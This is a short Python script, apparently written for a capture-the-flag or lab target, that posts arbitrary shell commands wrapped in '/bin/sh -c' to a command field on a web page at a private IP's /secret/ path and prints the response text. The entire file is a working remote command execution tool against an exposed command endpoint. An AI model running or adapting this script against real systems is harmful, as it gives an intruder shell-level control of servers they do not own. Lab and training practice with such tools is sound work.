import sys
import requests as rq

url = 'http://10.10.127.60/secret/'
s = rq.Session()

def run_cmd(cmd):
    res = s.post(url, data={'command': f'/bin/sh -c "{cmd}"'}).text
    head = res.find('<h2') + len('<h2 style="color:blue;">')
    end = res.find('</h2>')
    print(res[head:end])
    # print(res)

if len(sys.argv) == 2:
    run_cmd(sys.argv[1])
else:
    print('python3 cmd.py <cmd>')

